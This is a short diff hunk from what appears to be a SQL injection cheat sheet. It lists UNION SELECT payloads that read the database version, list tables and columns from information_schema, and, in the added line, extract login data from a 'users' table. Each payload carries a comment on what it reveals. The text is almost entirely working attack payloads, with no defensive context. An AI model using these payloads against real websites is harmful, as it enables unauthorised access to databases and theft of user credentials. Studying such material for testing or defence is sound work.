@@ -11,4 +11,4 @@
 > example.cpm union select 1,@@version,3,4 [ //column2 will give version ]
 > example.com union select 1, table_name,3,4 from information_schema.tables [// ytable displayed]
 > example.com union select 1, column_name,3,4 from information_schema.columns where table_name="users" [// column names displayed of table "users"]
-> 
+> example.com union select 1, login,3,4 from users[// login info]
